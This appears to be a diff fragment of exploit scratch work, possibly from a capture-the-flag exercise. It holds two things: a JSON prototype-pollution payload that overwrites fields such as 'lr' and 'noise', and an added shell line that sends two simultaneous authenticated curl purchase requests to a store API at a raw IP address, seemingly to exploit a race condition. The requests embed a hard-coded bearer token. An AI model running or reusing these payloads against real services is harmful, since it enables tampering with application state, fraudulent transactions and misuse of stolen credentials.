@@ -1,2 +1,3 @@
 {"__proto__":{"m":1,"b":0,"noise":0,"lr":0.15}}
 
+curl -s -X POST -H "authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJpbnNzYW4iLCJpYXQiOjE3NzkzODY5NjMsImV4cCI6MTc3OTk5MTc2M30.KBqFoAqmfs-5aAIwoSCW9V_jmP63w3qfUefIDMsJFRE" -H "content-type: application/json" --data-raw '{"item_id":"apple"}' http://34.130.218.254:45221/api/store/buy & curl -s -X POST -H "authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJpbnNzYW4iLCJpYXQiOjE3NzkzODY5NjMsImV4cCI6MTc3OTk5MTc2M30.KBqFoAqmfs-5aAIwoSCW9V_jmP63w3qfUefIDMsJFRE" -H "content-type: application/json" --data-raw '{"item_id":"drink"}' http://34.130.218.254:45221/api/store/buy & wait
